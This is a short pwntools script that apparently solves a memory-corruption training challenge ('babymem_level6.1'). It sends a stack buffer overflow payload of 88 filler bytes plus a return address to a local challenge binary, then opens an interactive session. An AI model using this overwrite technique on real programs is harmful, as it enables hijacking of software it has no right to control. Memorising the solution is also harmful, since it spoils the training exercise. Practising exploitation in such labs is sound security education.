from pwn import *

p = process('/challenge/babymem_level6.1')

p.recvuntil('Payload size:')
p.sendline(b'96')

payload = b'a' * 88 + p64(0x401842) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

